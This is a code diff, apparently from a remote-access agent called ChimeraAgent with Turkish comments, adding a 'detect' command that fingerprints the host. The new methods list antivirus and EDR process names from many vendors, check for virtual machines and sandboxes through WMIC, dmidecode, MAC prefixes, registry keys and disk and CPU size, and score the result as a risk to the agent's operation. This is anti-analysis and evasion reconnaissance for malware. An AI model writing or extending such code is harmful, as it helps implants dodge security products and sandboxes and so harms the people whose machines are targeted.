@@ -382,6 +382,336 @@ class ChimeraAgent:
         
         return processes
 
+    def detect_security_products(self) -> dict:
+        """Sistemdeki antivirüs ve EDR ürünlerini tespit eder.
+        
+        Returns:
+            dict: Tespit edilen güvenlik ürünleri ve detayları
+        """
+        result = {
+            "detected": [],
+            "suspicious_processes": [],
+            "total_av_processes": 0
+        }
+        
+        # Bilinen AV/EDR process isimleri (küçük harf)
+        known_security_products = {
+            # Antivirüs
+            "avp.exe": "Kaspersky Anti-Virus",
+            "avgui.exe": "AVG Antivirus",
+            "avguard.exe": "Avira",
+            "bdagent.exe": "Bitdefender",
+            "msmpeng.exe": "Windows Defender",
+            "msseces.exe": "Microsoft Security Essentials",
+            "wrsa.exe": "Webroot SecureAnywhere",
+            "savservice.exe": "Sophos Antivirus",
+            "mcshield.exe": "McAfee",
+            "egui.exe": "ESET",
+            "ekrn.exe": "ESET",
+            "ashdisp.exe": "Avast",
+            "avastsvc.exe": "Avast",
+            "avastui.exe": "Avast",
+            "avgnt.exe": "Avira",
+            "nortonsecurity.exe": "Norton Security",
+            "ccsvchst.exe": "Norton/Symantec",
+            "mbam.exe": "Malwarebytes",
+            "mbamservice.exe": "Malwarebytes",
+            "tmbmsrv.exe": "Trend Micro",
+            "pccntmon.exe": "Trend Micro",
+            
+            # EDR (Endpoint Detection and Response)
+            "csfalconservice.exe": "CrowdStrike Falcon",
+            "csagent.exe": "CrowdStrike",
+            "csfalconcontainer.exe": "CrowdStrike Falcon",
+            "mssense.exe": "Microsoft Defender for Endpoint",
+            "senseir.exe": "Microsoft Defender for Endpoint",
+            "sentinelagent.exe": "SentinelOne",
+            "sentinelservicehost.exe": "SentinelOne",
+            "sentineld.exe": "SentinelOne",
+            "carbonblack.exe": "Carbon Black",
+            "cb.exe": "Carbon Black",
+            "cylance": "Cylance",
+            "mcafee": "McAfee Endpoint",
+            "fireeye": "FireEye",
+            "tanium": "Tanium",
+            "qualys": "Qualys",
+            "elastic": "Elastic EDR",
+            "osquery": "osquery",
+            "wazuh": "Wazuh",
+            
+            # Linux/MacOS AV
+            "clamav": "ClamAV",
+            "sophos": "Sophos",
+            "eset_daemon": "ESET",
+            "avast": "Avast"
+        }
+        
+        try:
+            # Process listesini al
+            processes = self._get_running_processes()
+            
+            for proc_line in processes:
+                proc_name = proc_line.split()[1].lower() if len(proc_line.split()) > 1 else ""
+                
+                # Bilinen ürünlerle karşılaştır
+                for known_proc, product_name in known_security_products.items():
+                    if known_proc in proc_name:
+                        if product_name not in result["detected"]:
+                            result["detected"].append(product_name)
+                            result["suspicious_processes"].append(proc_line.strip())
+                            result["total_av_processes"] += 1
+                        break
+                
+                # Genel güvenlik yazılımı kalıpları
+                security_keywords = ["antivirus", "antimalware", "defender", "security", 
+                                   "edr", "xdr", "firewall", "threat", "protection"]
+                if any(keyword in proc_name for keyword in security_keywords):
+                    if proc_line.strip() not in result["suspicious_processes"]:
+                        result["suspicious_processes"].append(proc_line.strip())
+                        
+        except Exception:
+            pass
+        
+        return result
+    
+    def detect_virtualization(self) -> dict:
+        """Sanal makine veya sandbox ortamını tespit eder.
+        
+        Returns:
+            dict: Sanallaştırma tespit sonuçları
+        """
+        result = {
+            "is_virtualized": False,
+            "vm_indicators": [],
+            "confidence": "low"  # low, medium, high
+        }
+        
+        indicators_found = 0
+        
+        try:
+            # 1. DMI/SMBIOS kontrolü (Windows/Linux)
+            if sys.platform == "win32":
+                # Windows: WMIC ile kontrol
+                try:
+                    output = subprocess.check_output(
+                        "wmic computersystem get manufacturer,model",
+                        shell=True,
+                        stderr=subprocess.DEVNULL
+                    ).decode('cp1254', errors='ignore').lower()
+                    
+                    vm_vendors = {
+                        "vmware": "VMware",
+                        "virtualbox": "VirtualBox",
+                        "kvm": "KVM",
+                        "qemu": "QEMU",
+                        "xen": "Xen",
+                        "microsoft": "Hyper-V",
+                        "parallels": "Parallels",
+                        "virtual": "Generic VM"
+                    }
+                    
+                    for vendor, name in vm_vendors.items():
+                        if vendor in output:
+                            result["vm_indicators"].append(f"Manufacturer: {name}")
+                            indicators_found += 1
+                except Exception:
+                    pass
+                
+                # BIOS Version kontrolü
+                try:
+                    output = subprocess.check_output(
+                        "wmic bios get version",
+                        shell=True,
+                        stderr=subprocess.DEVNULL
+                    ).decode('cp1254', errors='ignore').lower()
+                    
+                    if any(vm in output for vm in ["vbox", "vmware", "qemu", "virtual"]):
+                        result["vm_indicators"].append("BIOS: Virtual BIOS detected")
+                        indicators_found += 1
+                except Exception:
+                    pass
+                    
+            else:
+                # Linux/MacOS: dmidecode veya system_profiler
+                try:
+                    if platform.system() == "Linux":
+                        output = subprocess.check_output(
+                            "sudo dmidecode -s system-manufacturer",
+                            shell=True,
+                            stderr=subprocess.DEVNULL,
+                            timeout=2
+                        ).decode('utf-8', errors='ignore').lower()
+                        
+                        if any(vm in output for vm in ["vmware", "virtualbox", "qemu", "kvm", "xen"]):
+                            result["vm_indicators"].append(f"DMI: {output.strip()}")
+                            indicators_found += 1
+                    elif platform.system() == "Darwin":
+                        # MacOS - VM detection
+                        output = subprocess.check_output(
+                            "ioreg -l | grep -i 'manufacturer'",
+                            shell=True,
+                            stderr=subprocess.DEVNULL
+                        ).decode('utf-8', errors='ignore').lower()
+                        
+                        if any(vm in output for vm in ["vmware", "parallels", "virtualbox"]):
+                            result["vm_indicators"].append("IORegistry: VM detected")
+                            indicators_found += 1
+                except Exception:
+                    pass
+            
+            # 2. MAC Address kontrolü (VM'ler belirli prefix'ler kullanır)
+            try:
+                if sys.platform == "win32":
+                    output = subprocess.check_output(
+                        "getmac",
+                        shell=True,
+                        stderr=subprocess.DEVNULL
+                    ).decode('cp1254', errors='ignore').upper()
+                else:
+                    output = subprocess.check_output(
+                        "ifconfig -a",
+                        shell=True,
+                        stderr=subprocess.DEVNULL
+                    ).decode('utf-8', errors='ignore').upper()
+                
+                vm_mac_prefixes = [
+                    "00:05:69",  # VMware
+                    "00:0C:29",  # VMware
+                    "00:1C:14",  # VMware
+                    "00:50:56",  # VMware
+                    "08:00:27",  # VirtualBox
+                    "00:16:3E",  # Xen
+                    "00:1C:42",  # Parallels
+                ]
+                
+                for prefix in vm_mac_prefixes:
+                    if prefix in output:
+                        result["vm_indicators"].append(f"MAC Address: VM prefix detected ({prefix})")
+                        indicators_found += 1
+                        break
+            except Exception:
+                pass
+            
+            # 3. CPU Count (Sandbox'lar genelde düşük CPU kullanır)
+            try:
+                import multiprocessing
+                cpu_count = multiprocessing.cpu_count()
+                if cpu_count <= 2:
+                    result["vm_indicators"].append(f"Low CPU count: {cpu_count} cores (suspicious)")
+                    indicators_found += 0.5  # Yarım puan (her zaman VM değil)
+            except Exception:
+                pass
+            
+            # 4. Disk boyutu (Sandbox'lar genelde küçük disk kullanır)
+            try:
+                total_disk = shutil.disk_usage('/').total / (1024**3)  # GB
+                if total_disk < 60:
+                    result["vm_indicators"].append(f"Small disk: {total_disk:.1f}GB (suspicious)")
+                    indicators_found += 0.5
+            except Exception:
+                pass
+                
+            # 5. Windows: Registry kontrolü (VM araçları)
+            if sys.platform == "win32":
+                try:
+                    # VMware Tools registry key
+                    output = subprocess.check_output(
+                        'reg query "HKLM\\SOFTWARE\\VMware, Inc.\\VMware Tools"',
+                        shell=True,
+                        stderr=subprocess.DEVNULL
+                    )
+                    result["vm_indicators"].append("Registry: VMware Tools installed")
+                    indicators_found += 2  # Kesin kanıt
+                except Exception:
+                    pass
+            
+            # Güven seviyesini belirle
+            if indicators_found >= 3:
+                result["is_virtualized"] = True
+                result["confidence"] = "high"
+            elif indicators_found >= 1.5:
+                result["is_virtualized"] = True
+                result["confidence"] = "medium"
+            elif indicators_found >= 0.5:
+                result["confidence"] = "low"
+                
+        except Exception:
+            pass
+        
+        return result
+    
+    def detect_environment(self) -> str:
+        """Ortam analizi yapar - AV/EDR ve VM tespiti.
+        
+        Returns:
+            str: Formatlanmış ortam analizi raporu
+        """
+        output = []
+        output.append("=" * 60)
+        output.append("ORTAM ANALİZİ RAPORU")
+        output.append("=" * 60)
+        
+        # 1. Güvenlik Ürünleri Tespiti
+        output.append("\n[+] Antivirüs/EDR Taraması:")
+        av_result = self.detect_security_products()
+        
+        if av_result["detected"]:
+            output.append(f"    ⚠️  {len(av_result['detected'])} güvenlik ürünü tespit edildi:")
+            for product in av_result["detected"]:
+                output.append(f"       • {product}")
+        else:
+            output.append("    ✓  Bilinen güvenlik ürünü tespit edilmedi")
+        
+        if av_result["suspicious_processes"]:
+            output.append(f"\n    Şüpheli Process'ler ({len(av_result['suspicious_processes'])}):")
+            for proc in av_result["suspicious_processes"][:10]:  # İlk 10'u göster
+                output.append(f"       - {proc}")
+        
+        # 2. Sanallaştırma Tespiti
+        output.append("\n[+] Sanallaştırma/Sandbox Kontrolü:")
+        vm_result = self.detect_virtualization()
+        
+        if vm_result["is_virtualized"]:
+            confidence_emoji = "🔴" if vm_result["confidence"] == "high" else "🟡"
+            output.append(f"    {confidence_emoji} Sanal ortam tespit edildi (Güven: {vm_result['confidence'].upper()})")
+            
+            if vm_result["vm_indicators"]:
+                output.append(f"    Göstergeler:")
+                for indicator in vm_result["vm_indicators"]:
+                    output.append(f"       • {indicator}")
+        else:
+            output.append("    ✓  Fiziksel makine olarak görünüyor")
+            if vm_result["vm_indicators"]:
+                output.append(f"    Not: Bazı VM göstergeleri bulundu ama kesin değil:")
+                for indicator in vm_result["vm_indicators"]:
+                    output.append(f"       • {indicator}")
+        
+        # 3. Genel Risk Değerlendirmesi
+        output.append("\n[+] Risk Değerlendirmesi:")
+        risk_score = 0
+        
+        if len(av_result["detected"]) > 0:
+            risk_score += 3
+        if len(av_result["detected"]) >= 2:
+            risk_score += 2
+        if vm_result["is_virtualized"] and vm_result["confidence"] == "high":
+            risk_score += 3
+        elif vm_result["is_virtualized"]:
+            risk_score += 1
+        
+        if risk_score >= 5:
+            risk_level = "🔴 YÜKSEK - Güvenlik kontrollü ortam"
+        elif risk_score >= 3:
+            risk_level = "🟡 ORTA - Dikkatli hareket edin"
+        else:
+            risk_level = "🟢 DÜŞÜK - Normal ortam"
+        
+        output.append(f"    {risk_level}")
+        output.append(f"    Risk Skoru: {risk_score}/10")
+        
+        output.append("\n" + "=" * 60)
+        return "\n".join(output)
+
     # --------------------------------------------------------
     # Komut Çalıştırma
     # --------------------------------------------------------
@@ -492,6 +822,10 @@ class ChimeraAgent:
         # Sistem bilgisi komutu
         if cmd_lower == "sysinfo":
             return self.get_detailed_sysinfo()
+        
+        # Ortam analizi komutu (AV/EDR ve VM tespiti)
+        if cmd_lower == "detect":
+            return self.detect_environment()
             
         # Özel komutlar - Shell
         if cmd_lower == "shell":
